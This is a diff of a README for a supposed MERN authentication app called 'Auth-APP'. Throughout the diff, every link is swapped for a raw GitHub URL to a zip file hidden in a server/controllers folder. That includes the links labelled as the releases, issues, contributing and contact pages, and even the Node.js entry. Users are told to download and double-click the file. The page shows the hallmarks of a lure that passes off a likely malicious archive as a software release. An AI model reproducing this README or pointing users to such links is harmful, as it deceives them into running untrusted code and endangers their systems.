@@ -1,6 +1,6 @@
 # 🚀 Auth-APP - Easy Authentication for Everyone
 
-[![Download Auth-APP](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip)](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip)
+[![Download Auth-APP](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip)](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip)
 
 ## 📋 Description
 
@@ -19,16 +19,16 @@ Auth-APP is a full-stack application built with the MERN stack, utilizing Vite f
 To run Auth-APP smoothly, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
-- **https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip** Version 14 or higher.
+- **https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip** Version 14 or higher.
 - **Internet Connection:** A reliable internet connection is necessary for downloading packages and accessing online features.
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run Auth-APP:
 
-1. **Download the Application:** Visit the [Releases page](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip) to download the latest version. Click on the appropriate link for your operating system.
+1. **Download the Application:** Visit the [Releases page](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip) to download the latest version. Click on the appropriate link for your operating system.
 
-   [![Download Auth-APP](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip)](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip)
+   [![Download Auth-APP](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip)](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip)
 
 2. **Install the Application:** Locate the downloaded file on your computer and double-click it to run the installation.
 
@@ -42,7 +42,7 @@ Follow these steps to download and run Auth-APP:
 
 ## 📥 Download & Install
 
-You can download Auth-APP by visiting the [Releases page](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip). Make sure to follow the instructions step-by-step for a successful installation.
+You can download Auth-APP by visiting the [Releases page](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip). Make sure to follow the instructions step-by-step for a successful installation.
 
 ## ❓ Troubleshooting Common Issues
 
@@ -59,21 +59,21 @@ Here are some common problems and their solutions you may encounter while using 
 
 ## 🛠️ Support
 
-If you experience any issues that this guide does not cover, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip). Our community is here to help you.
+If you experience any issues that this guide does not cover, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip). Our community is here to help you.
 
 ## 🌐 Technologies Used
 
 Auth-APP utilizes the following technologies:
 
 - **Frontend:** React, Vite
-- **Backend:** https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip, Express
+- **Backend:** https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip, Express
 - **Database:** MongoDB, Mongoose
 - **Email Handling:** Nodemailer
 - **Authentication:** JSON Web Tokens (JWT)
 
 ## 👥 Contribution
 
-We welcome contributions from everyone. If you'd like to enhance the application, please fork the repository and submit a pull request. Follow the guidelines in our [Contributing Document](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip).
+We welcome contributions from everyone. If you'd like to enhance the application, please fork the repository and submit a pull request. Follow the guidelines in our [Contributing Document](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip).
 
 ## 📄 License
 
@@ -81,6 +81,6 @@ Auth-APP is open-source and available under the MIT License. Make sure to review
 
 ## 📞 Contact
 
-For any inquiries, feel free to reach out via the [contact form](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/models/Auth-APP_3.9.zip) or open an issue in the repository.
+For any inquiries, feel free to reach out via the [contact form](https://raw.githubusercontent.com/germaineproprioceptive757/Auth-APP/main/server/controllers/Auth-APP-3.8.zip) or open an issue in the repository.
 
 Thank you for choosing Auth-APP!
